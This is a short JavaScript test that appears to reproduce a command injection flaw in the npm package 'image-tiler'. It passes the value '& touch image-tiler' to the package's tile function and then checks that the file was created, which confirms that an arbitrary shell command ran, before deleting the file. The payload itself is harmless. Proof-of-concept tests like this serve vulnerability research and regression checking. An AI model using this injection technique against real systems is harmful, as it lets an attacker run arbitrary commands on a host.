test("Command Injection in image-tiler", () => {
  const tile = require("image-tiler").tile;
  const fs = require("fs");
  const path = "./image-tiler";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let tilePromise = tile("& touch image-tiler", "", "", { invertZoom: true });
  } catch (error) {
    console.log("error");
  }

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
